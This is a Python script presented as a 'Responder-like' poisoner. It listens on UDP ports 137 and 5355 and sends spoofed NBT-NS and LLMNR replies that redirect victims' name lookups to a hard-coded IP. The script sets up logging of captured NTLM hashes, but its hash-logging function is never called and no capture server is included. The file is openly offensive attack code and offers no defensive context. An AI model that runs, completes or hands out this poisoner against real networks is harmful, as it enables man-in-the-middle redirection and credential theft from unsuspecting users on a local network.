import socket
import struct
import threading
import sys
import hashlib
import hmac
import os
from binascii import hexlify

HASH_LOG = '/tmp/ntlm_hashes.txt'
TARGET_IP = '172.17.200.23'

def log_hash(client_ip, hash_data, protocol):
    ts = __import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(HASH_LOG, 'a') as f:
        f.write(f"[{ts}] {protocol} hash from {client_ip}\n")
        f.write(f"{hash_data}\n")
        f.write("-" * 60 + "\n")
    print(f"[!] {protocol} hash captured from {client_ip}")

def nbns_listener():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    try:
        sock.bind(('0.0.0.0', 137))
    except PermissionError:
        print("[-] Need root for port 137")
        return
    
    while True:
        try:
            data, addr = sock.recvfrom(1024)
            if len(data) < 12:
                continue
            flags = struct.unpack('>H', data[2:4])[0]
            if flags & 0x8000:
                continue
            qdcount = struct.unpack('>H', data[4:6])[0]
            if qdcount == 0:
                continue
            
            pos = 12
            name_parts = []
            while pos < len(data) and len(name_parts) < 20:
                length = data[pos]
                if length == 0:
                    pos += 1
                    break
                if length & 0xC0:
                    pos += 2
                    break
                pos += 1
                name_parts.append(data[pos:pos+length].decode('latin-1', errors='replace'))
                pos += length
            
            qname = '.'.join(name_parts) if name_parts else 'unknown'
            
            if len(data) >= pos + 4:
                qtype = struct.unpack('>H', data[pos:pos+2])[0]
            else:
                continue
            
            if qtype != 0x0020:  # NB
                continue
            
            tid = struct.unpack('>H', data[0:2])[0]
            
            # Build spoofed response
            resp_flags = 0x8500  # Response + Authoritative
            
            # Use original query name encoding
            enc_name = data[12:pos]
            if len(enc_name) > 34:
                enc_name = enc_name[:34]
            while len(enc_name) < 34:
                enc_name += b'\x00'
            enc_name = enc_name[:34]
            
            ip_parts = [int(x) for x in TARGET_IP.split('.')]
            
            question = enc_name + struct.pack('>HH', qtype, 0x0001)
            answer = enc_name + struct.pack('>HHI', 0x0020, 0x0001, 300)
            answer += struct.pack('>H', 6) + struct.pack('>BB', 0x00, 0x00)
            answer += struct.pack('>BBBB', *ip_parts)
            
            resp = struct.pack('>HHHH', tid, resp_flags, 1, 1)
            resp += struct.pack('>HH', 0, 0)  # authority, additional
            resp += question + answer
            
            sock.sendto(resp, (addr[0], 137))
            print(f"[NBT-NS] Spoofed '{qname}' for {addr[0]} -> {TARGET_IP}")
        except Exception as e:
            print(f"[NBT-NS] Error: {e}")

def llmnr_listener():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    try:
        sock.bind(('0.0.0.0', 5355))
    except PermissionError:
        print("[-] Need root for port 5355")
        return
    
    while True:
        try:
            data, addr = sock.recvfrom(1024)
            if len(data) < 12:
                continue
            flags = struct.unpack('>H', data[2:4])[0]
            if flags & 0x8000:
                continue
            qdcount = struct.unpack('>H', data[4:6])[0]
            if qdcount == 0:
                continue
            
            # Parse LLMNR question name
            pos = 12
            name_parts = []
            while pos < len(data):
                length = data[pos]
                if length == 0:
                    pos += 1
                    break
                if length & 0xC0:
                    pos += 2
                    break
                pos += 1
                name_parts.append(data[pos:pos+length].decode('latin-1', errors='replace'))
                pos += length
            
            qname = '.'.join(name_parts) if name_parts else 'unknown'
            
            tid = struct.unpack('>H', data[0:2])[0]
            
            # Build LLMNR response with our IP
            ip_parts = [int(x) for x in TARGET_IP.split('.')]
            # Keep same ID, set response flag
            resp_flags = 0x8000 | (flags & 0x0FFF)
            
            # Simple A record response
            enc_name = data[12:pos]
            
            question = enc_name + struct.pack('>HH', 0x0001, 0x0001)  # type A, class IN
            answer = enc_name + struct.pack('>HHI', 0x0001, 0x0001, 30)  # type A, class IN, TTL
            answer += struct.pack('>H', 4) + struct.pack('>BBBB', *ip_parts)
            
            resp = struct.pack('>HHHH', tid, resp_flags, 1, 1)
            resp += struct.pack('>HH', 0, 0)
            resp += question + answer
            
            sock.sendto(resp, (addr[0], 5355))
            print(f"[LLMNR] Spoofed '{qname}' for {addr[0]} -> {TARGET_IP}")
        except Exception as e:
            print(f"[LLMNR] Error: {e}")

if __name__ == '__main__':
    print("=" * 50)
    print("  Responder-like NBT-NS/LLMNR Poisoner")
    print(f"  Spoofing to: {TARGET_IP}")
    print(f"  Hashes logged: {HASH_LOG}")
    print("=" * 50)
    
    t1 = threading.Thread(target=nbns_listener, daemon=True)
    t2 = threading.Thread(target=llmnr_listener, daemon=True)
    t1.start()
    t2.start()
    
    print("[+] NBT-NS listener on UDP 137")
    print("[+] LLMNR listener on UDP 5355")
    print("[+] Waiting for victim queries...")
    
    try:
        while True:
            import time
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*] Shutting down")
